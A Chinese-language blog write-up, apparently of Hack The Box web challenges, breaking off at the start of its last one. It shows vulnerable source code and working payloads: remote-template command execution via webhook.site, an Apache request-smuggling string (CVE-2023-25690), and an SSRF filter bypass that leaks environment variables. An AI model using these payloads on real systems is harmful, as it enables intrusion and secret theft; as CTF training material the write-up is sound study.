class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;encoding/json&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;html/template&quot;</span><br><span class="line">	&quot;io&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">	&quot;os&quot;</span><br><span class="line">	&quot;os/exec&quot;</span><br><span class="line">	&quot;path/filepath&quot;</span><br><span class="line">	&quot;strings&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">const WEB_PORT = &quot;1337&quot;</span><br><span class="line">const TEMPLATE_DIR = &quot;./templates&quot;</span><br><span class="line"></span><br><span class="line">type LocationInfo struct &#123;</span><br><span class="line">	IpVersion     int     `json:&quot;ipVersion&quot;`</span><br><span class="line">	IpAddress     string  `json:&quot;ipAddress&quot;`</span><br><span class="line">	Latitude      float64 `json:&quot;latitude&quot;`</span><br><span class="line">	Longitude     float64 `json:&quot;longitude&quot;`</span><br><span class="line">	CountryName   string  `json:&quot;countryName&quot;`</span><br><span class="line">	CountryCode   string  `json:&quot;countryCode&quot;`</span><br><span class="line">	TimeZone      string  `json:&quot;timeZone&quot;`</span><br><span class="line">	ZipCode       string  `json:&quot;zipCode&quot;`</span><br><span class="line">	CityName      string  `json:&quot;cityName&quot;`</span><br><span class="line">	RegionName    string  `json:&quot;regionName&quot;`</span><br><span class="line">	Continent     string  `json:&quot;continent&quot;`</span><br><span class="line">	ContinentCode string  `json:&quot;continentCode&quot;`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type MachineInfo struct &#123;</span><br><span class="line">	Hostname      string</span><br><span class="line">	OS            string</span><br><span class="line">	KernelVersion string</span><br><span class="line">	Memory        string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type RequestData struct &#123;</span><br><span class="line">	ClientIP     string</span><br><span class="line">	ClientUA     string</span><br><span class="line">	ServerInfo   MachineInfo</span><br><span class="line">	ClientIpInfo LocationInfo `json:&quot;location&quot;`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (p RequestData) FetchServerInfo(command string) string &#123;</span><br><span class="line">	out, err := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command).Output()</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return &quot;&quot;</span><br><span class="line">	&#125;</span><br><span class="line">	return string(out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (p RequestData) GetLocationInfo(endpointURL string) (*LocationInfo, error) &#123;</span><br><span class="line">	resp, err := http.Get(endpointURL)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	defer resp.Body.Close()</span><br><span class="line"></span><br><span class="line">	if resp.StatusCode != http.StatusOK &#123;</span><br><span class="line">		return nil, fmt.Errorf(&quot;HTTP request failed with status code: %d&quot;, resp.StatusCode)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	body, err := io.ReadAll(resp.Body)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	var locationInfo LocationInfo</span><br><span class="line">	if err := json.Unmarshal(body, &amp;locationInfo); err != nil &#123;</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return &amp;locationInfo, nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func isSubdirectory(basePath, path string) bool &#123;</span><br><span class="line">	rel, err := filepath.Rel(basePath, path)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return false</span><br><span class="line">	&#125;</span><br><span class="line">	return !strings.HasPrefix(rel, &quot;..&quot;+string(filepath.Separator))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func readFile(filepath string, basePath string) (string, error) &#123;</span><br><span class="line">	if !isSubdirectory(basePath, filepath) &#123;</span><br><span class="line">		return &quot;&quot;, fmt.Errorf(&quot;Invalid filepath&quot;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	data, err := os.ReadFile(filepath)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return &quot;&quot;, err</span><br><span class="line">	&#125;</span><br><span class="line">	return string(data), nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func readRemoteFile(url string) (string, error) &#123;</span><br><span class="line">	response, err := http.Get(url)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return &quot;&quot;, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	defer response.Body.Close()</span><br><span class="line"></span><br><span class="line">	if response.StatusCode != http.StatusOK &#123;</span><br><span class="line">		return &quot;&quot;, fmt.Errorf(&quot;HTTP request failed with status code: %d&quot;, response.StatusCode)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	content, err := io.ReadAll(response.Body)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return &quot;&quot;, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return string(content), nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func getIndex(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">	http.Redirect(w, r, &quot;/render?page=index.tpl&quot;, http.StatusMovedPermanently)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func getTpl(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">	var page string = r.URL.Query().Get(&quot;page&quot;)</span><br><span class="line">	var remote string = r.URL.Query().Get(&quot;use_remote&quot;)</span><br><span class="line"></span><br><span class="line">	if page == &quot;&quot; &#123;</span><br><span class="line">		http.Error(w, &quot;Missing required parameters&quot;, http.StatusBadRequest)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	reqData := &amp;RequestData&#123;&#125;</span><br><span class="line"></span><br><span class="line">	userIPCookie, err := r.Cookie(&quot;user_ip&quot;)</span><br><span class="line">	clientIP := &quot;&quot;</span><br><span class="line"></span><br><span class="line">	if err == nil &#123;</span><br><span class="line">		clientIP = userIPCookie.Value</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		clientIP = strings.Split(r.RemoteAddr, &quot;:&quot;)[0]</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	userAgent := r.Header.Get(&quot;User-Agent&quot;)</span><br><span class="line"></span><br><span class="line">	locationInfo, err := reqData.GetLocationInfo(&quot;https://freeipapi.com/api/json/&quot; + clientIP)</span><br><span class="line"></span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		http.Error(w, &quot;Could not fetch IP location info&quot;, http.StatusInternalServerError)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	reqData.ClientIP = clientIP</span><br><span class="line">	reqData.ClientUA = userAgent</span><br><span class="line">	reqData.ClientIpInfo = *locationInfo</span><br><span class="line">	reqData.ServerInfo.Hostname = reqData.FetchServerInfo(&quot;hostname&quot;)</span><br><span class="line">	reqData.ServerInfo.OS = reqData.FetchServerInfo(&quot;cat /etc/os-release | grep PRETTY_NAME | cut -d &#x27;\&quot;&#x27; -f 2&quot;)</span><br><span class="line">	reqData.ServerInfo.KernelVersion = reqData.FetchServerInfo(&quot;uname -r&quot;)</span><br><span class="line">	reqData.ServerInfo.Memory = reqData.FetchServerInfo(&quot;free -h | awk &#x27;/^Mem/&#123;print $2&#125;&#x27;&quot;)</span><br><span class="line"></span><br><span class="line">	var tmplFile string</span><br><span class="line"></span><br><span class="line">	if remote == &quot;true&quot; &#123;</span><br><span class="line">		tmplFile, err = readRemoteFile(page)</span><br><span class="line"></span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		tmplFile, err = readFile(TEMPLATE_DIR+&quot;/&quot;+page, &quot;./&quot;)</span><br><span class="line"></span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	tmpl, err := template.New(&quot;page&quot;).Parse(tmplFile)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = tmpl.Execute(w, reqData)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	mux := http.NewServeMux()</span><br><span class="line"></span><br><span class="line">	mux.HandleFunc(&quot;/&quot;, getIndex)</span><br><span class="line">	mux.HandleFunc(&quot;/render&quot;, getTpl)</span><br><span class="line">	mux.Handle(&quot;/static/&quot;, http.StripPrefix(&quot;/static/&quot;, http.FileServer(http.Dir(&quot;static&quot;))))</span><br><span class="line"></span><br><span class="line">	fmt.Println(&quot;Server started at port &quot; + WEB_PORT)</span><br><span class="line">	http.ListenAndServe(&quot;:&quot;+WEB_PORT, mux)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>其他的不看光看调用包就可以找到我们需要的漏洞，import 了一个 os 并且在</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">func (p RequestData) FetchServerInfo(command string) string &#123;</span><br><span class="line">	out, err := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command).Output()</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return &quot;&quot;</span><br><span class="line">	&#125;</span><br><span class="line">	return string(out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>这里调用了一个 exec.Command 并且是调用的 sh -c 就是命令执行的意思，</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You&#x27;ve found a website that lets you input remote templates for rendering. Your task is to exploit this system&#x27;s vulnerabilities to access and retrieve a hidden flag. Good luck!</span><br></pre></td></tr></table></figure><p></p><p>这里也说明了模板渲染，那抓包查看下面的<img data-src="/pic/image-20231210145451007.png" alt="image-20231210145451007"></p><p>这个页面的下面还能跳转我们要的网页，</p><p><img data-src="/pic/image-20231210145537106.png" alt="image-20231210145537106"></p><p>这里使用的抓包可以知道 use_remote=true 并且 page 就是你需要立即渲染的地方，因为内网 ip 无法访问那么我们可以使用 webhook.site 来生成需要的内容接取</p><p><img data-src="/pic/image-20231210145732624.png" alt="image-20231210145732624"></p><p>这里调用了.FetchServerInfo 来直接执行命令，因为我们的目标就是这个</p><p><img data-src="/pic/image-20231210145837130.png" alt="image-20231210145837130"></p><p>命令执行成功，达到目的</p><h3 id="apacheblaze"><a class="anchor" href="#apacheblaze">#</a> ApacheBlaze</h3><p>Step into the ApacheBlaze universe, a world of arcade clicky games. Rumor has it that by playing certain games, you have the chance to win a grand prize. However, before you can dive into the fun, you'll need to crack a puzzle.</p><p>这个题打的我很懵</p><p>我看了一下 app.py 里面的代码</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[&#x27;GAMES&#x27;] = &#123;&#x27;magic_click&#x27;, &#x27;click_mania&#x27;, &#x27;hyper_clicker&#x27;, &#x27;click_topia&#x27;&#125;</span><br><span class="line">app.config[&#x27;FLAG&#x27;] = &#x27;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    game = request.args.get(&#x27;game&#x27;)</span><br><span class="line"></span><br><span class="line">    if not game:</span><br><span class="line">        return jsonify(&#123;</span><br><span class="line">            &#x27;error&#x27;: &#x27;Empty game name is not supported!.&#x27;</span><br><span class="line">        &#125;), 400</span><br><span class="line"></span><br><span class="line">    elif game not in app.config[&#x27;GAMES&#x27;]:</span><br><span class="line">        return jsonify(&#123;</span><br><span class="line">            &#x27;error&#x27;: &#x27;Invalid game name!&#x27;</span><br><span class="line">        &#125;), 400</span><br><span class="line"></span><br><span class="line">    elif game == &#x27;click_topia&#x27;:</span><br><span class="line">        if request.headers.get(&#x27;X-Forwarded-Host&#x27;) == &#x27;dev.apacheblaze.local&#x27;:</span><br><span class="line">            return jsonify(&#123;</span><br><span class="line">                &#x27;message&#x27;: f&#x27;&#123;app.config[&quot;FLAG&quot;]&#125;&#x27;</span><br><span class="line">            &#125;), 200</span><br><span class="line">        else:</span><br><span class="line">            return jsonify(&#123;</span><br><span class="line">                &#x27;message&#x27;: &#x27;This game is currently available only from dev.apacheblaze.local.&#x27;</span><br><span class="line">            &#125;), 200</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line">        return jsonify(&#123;</span><br><span class="line">            &#x27;message&#x27;: &#x27;This game is currently unavailable due to internal maintenance.&#x27;</span><br><span class="line">        &#125;), 200</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>还以为常规方法只要 game<mark>click_topia，以及 X-Forwarded-Host</mark>dev.apacheblaze.local 就能拿到 flag，是我大意了，试了一会发现根本出不了 flag，又去查看了一下 api.js</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$(document).ready(function() &#123;</span><br><span class="line">  $(&quot;.game a&quot;).click(function(event) &#123;</span><br><span class="line">      event.preventDefault();</span><br><span class="line">      var gameName = $(this).attr(&quot;div&quot;);</span><br><span class="line"></span><br><span class="line">      $.ajax(&#123;</span><br><span class="line">          url: &quot;/api/games/&quot; + gameName,</span><br><span class="line">          success: function(data) &#123;</span><br><span class="line">              var message = data.message;</span><br><span class="line">              $(&quot;#gameplayresults&quot;).text(message);</span><br><span class="line">          &#125;,</span><br><span class="line">          error: function() &#123;</span><br><span class="line">              $(&quot;#gameplayresults&quot;).text(&quot;Error fetching API data.&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p></p><p>查看到了里面有个 url: &quot;/api/games/&quot; + gameName, 我想到了 gameName 换成 click_topia 然后提示 app.py 里面的</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">return jsonify(&#123;</span><br><span class="line">               &#x27;message&#x27;: &#x27;This game is currently available only from dev.apacheblaze.local.&#x27;</span><br><span class="line">           &#125;), 200</span><br></pre></td></tr></table></figure><p></p><p>加上 X-Forwarded-Host==dev.apacheblaze.local 还是没有反应，试了很久发现还是不行，查看了大佬的 wp 发现我方法错了</p><p><img data-src="/pic/image-20231210153436785.png" alt="image-20231210153436785"></p><p>应该向去查看 httpd.conf 的语法，里面有一个重定向，并且还设置了一个 proxy 也就说说我刚刚上面那两个其实都是一个，现在很清楚了，端口 1337 和 8080 上的 2 个虚拟主机（反向代理和负载均衡器）在请求处理期间被附加到 X-Forwarded-Host 标头。</p><p>并且大佬还说了利用方法 HTTP 请求走私攻击 (CVE-2023–25690)</p><p>通过这个漏洞，我们了解到我们可以在发送到目标的第一个请求中隐藏第二个请求（使用 <code>\r\n\r</code> 拆分方法）。这使我们能够直接从反向代理发送请求，因此我们不会将其他内容附加到 X-Forwarded-Host 标头的末尾</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /api/games/click_topia HTTP/1.1</span><br><span class="line">主机：dev.apacheblaze.local </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">主机：localhost:1337 </span><br><span class="line"></span><br><span class="line">-------------------------- ------------</span><br><span class="line"></span><br><span class="line">编码提醒: </span><br><span class="line"></span><br><span class="line">\r\n -&gt; %0d%0a </span><br><span class="line">\r\n\r -&gt; %0d%0a%0d</span><br></pre></td></tr></table></figure><p></p><p>进行 url 编码</p><p><img data-src="/pic/image-20231210154202586.png" alt="image-20231210154202586"></p><p>需要注意的是进行常规的 url 编码后无法编码 %0d 需要自己加上去最后是</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/ HTTP/1.1</span><br></pre></td></tr></table></figure><p></p><h3 id="proxyasaservice"><a class="anchor" href="#proxyasaservice">#</a> ProxyAsAService</h3><p>Experience the freedom of the web with ProxyAsAService. Because online privacy and access should be for everyone, everywhere.</p><p>这个题又是一个 python 写的，题目描述了代理我们一个一个文件开始看</p><p>首先是 dockerfiler</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXPOSE 1337</span><br><span class="line">ENV FLAG=HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;</span><br></pre></td></tr></table></figure><p></p><p><span class="exturl" data-url="aHR0cDovL3huLS1hcHAtMGg5ZHFxNjl3dmxweTBzM3Z3OHFwLnB5">然后就是代码了 app.py</span></p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, jsonify</span><br><span class="line">from application.blueprints.routes import proxy_api, debug</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(&#x27;application.config.Config&#x27;)</span><br><span class="line"></span><br><span class="line">app.register_blueprint(proxy_api, url_prefix=&#x27;/&#x27;)</span><br><span class="line">app.register_blueprint(debug, url_prefix=&#x27;/debug&#x27;)</span><br><span class="line"></span><br><span class="line">@app.errorhandler(404)</span><br><span class="line">def not_found(error):</span><br><span class="line">    return jsonify(&#123;&#x27;error&#x27;: &#x27;Not Found&#x27;&#125;), 404</span><br><span class="line"></span><br><span class="line">@app.errorhandler(403)</span><br><span class="line">def forbidden(error):</span><br><span class="line">    return jsonify(&#123;&#x27;error&#x27;: &#x27;Not Allowed&#x27;&#125;), 403</span><br><span class="line"></span><br><span class="line">@app.errorhandler(400)</span><br><span class="line">def bad_request(error):</span><br><span class="line">    return jsonify(&#123;&#x27;error&#x27;: &#x27;Bad Request&#x27;&#125;), 400</span><br></pre></td></tr></table></figure><p></p><p>里面就是一些控制报错输出查看引用包，routes</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from flask import Blueprint, request, Response, jsonify, redirect, url_for</span><br><span class="line">from application.util import is_from_localhost, proxy_req</span><br><span class="line">import random, os</span><br><span class="line"></span><br><span class="line">SITE_NAME = &#x27;reddit.com&#x27;</span><br><span class="line"></span><br><span class="line">proxy_api = Blueprint(&#x27;proxy_api&#x27;, __name__)</span><br><span class="line">debug     = Blueprint(&#x27;debug&#x27;, __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@proxy_api.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def proxy():</span><br><span class="line">    url = request.args.get(&#x27;url&#x27;)</span><br><span class="line"></span><br><span class="line">    if not url:</span><br><span class="line">        cat_meme_subreddits = [</span><br><span class="line">            &#x27;/r/cats/&#x27;,</span><br><span class="line">            &#x27;/r/catpictures&#x27;,</span><br><span class="line">            &#x27;/r/catvideos/&#x27;</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        random_subreddit = random.choice(cat_meme_subreddits)</span><br><span class="line"></span><br><span class="line">        return redirect(url_for(&#x27;.proxy&#x27;, url=random_subreddit))</span><br><span class="line">    </span><br><span class="line">    target_url = f&#x27;http://&#123;SITE_NAME&#125;&#123;url&#125;&#x27;</span><br><span class="line">    response, headers = proxy_req(target_url)</span><br><span class="line"></span><br><span class="line">    return Response(response.content, response.status_code, headers.items())</span><br><span class="line"></span><br><span class="line">@debug.route(&#x27;/environment&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">@is_from_localhost</span><br><span class="line">def debug_environment():</span><br><span class="line">    environment_info = &#123;</span><br><span class="line">        &#x27;Environment variables&#x27;: dict(os.environ),</span><br><span class="line">        &#x27;Request headers&#x27;: dict(request.headers)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return jsonify(environment_info)</span><br></pre></td></tr></table></figure><p></p><p>导入了 os，下面的 debug_environment (): 还调用了 os 输出了 os.environ</p><p>回到 app.py 查看路由控制</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.register_blueprint(proxy_api, url_prefix=&#x27;/&#x27;)</span><br><span class="line"></span><br><span class="line">app.register_blueprint(debug, url_prefix=&#x27;/debug&#x27;)</span><br></pre></td></tr></table></figure><p></p><p>这里都是调用的 routes 里面的函数 proxy_api</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@proxy_api.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def proxy():</span><br><span class="line">    url = request.args.get(&#x27;url&#x27;)</span><br><span class="line"></span><br><span class="line">    if not url:</span><br><span class="line">        cat_meme_subreddits = [</span><br><span class="line">            &#x27;/r/cats/&#x27;,</span><br><span class="line">            &#x27;/r/catpictures&#x27;,</span><br><span class="line">            &#x27;/r/catvideos/&#x27;</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        random_subreddit = random.choice(cat_meme_subreddits)</span><br><span class="line"></span><br><span class="line">        return redirect(url_for(&#x27;.proxy&#x27;, url=random_subreddit))</span><br><span class="line">    </span><br><span class="line">    target_url = f&#x27;http://&#123;SITE_NAME&#125;&#123;url&#125;&#x27;</span><br><span class="line">    response, headers = proxy_req(target_url)</span><br><span class="line"></span><br><span class="line">    return Response(response.content, response.status_code, headers.items())</span><br></pre></td></tr></table></figure><p></p><p>这个代码控制了用户的默认界面为这 3 个中的随机一个然后就是</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@debug.route(&#x27;/environment&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">@is_from_localhost</span><br><span class="line">def debug_environment():</span><br><span class="line">    environment_info = &#123;</span><br><span class="line">        &#x27;Environment variables&#x27;: dict(os.environ),</span><br><span class="line">        &#x27;Request headers&#x27;: dict(request.headers)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return jsonify(environment_info)</span><br></pre></td></tr></table></figure><p></p><p>也就是说只要调用了 /debug/environment 就能得到 flag</p><p>需要注意的是 @is_from_localhost 调用了一个过滤函数</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">RESTRICTED_URLS = [&#x27;localhost&#x27;, &#x27;127.&#x27;, &#x27;192.168.&#x27;, &#x27;10.&#x27;, &#x27;172.&#x27;]</span><br><span class="line"></span><br><span class="line">def is_safe_url(url):</span><br><span class="line">    for restricted_url in RESTRICTED_URLS:</span><br><span class="line">        if restricted_url in url:</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def is_from_localhost(func):</span><br><span class="line">    @functools.wraps(func)</span><br><span class="line">    def check_ip(*args, **kwargs):</span><br><span class="line">        if request.remote_addr != &#x27;127.0.0.1&#x27;:</span><br><span class="line">            return abort(403)</span><br><span class="line">        return func(*args, **kwargs)</span><br><span class="line">    return check_ip</span><br></pre></td></tr></table></figure><p></p><p>这里过滤了 127.0.0.1 那我们可以使用 0.0.0.0 也是可以的，</p><p>使用</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://188.166.175.58:31579/?url=@0.0.0.0:1337/debug/environment</span><br></pre></td></tr></table></figure><p></p><p>即可绕过</p><h3 id="jscalc"><a class="anchor" href="#jscalc">#</a> jscalc</h3><p>这个题比较简单使用 js 的 fs</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /api/calculate HTTP/1.1</span><br><span class="line">Host: 188.166.175.58:31222</span><br><span class="line">Content-Length: 65</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span 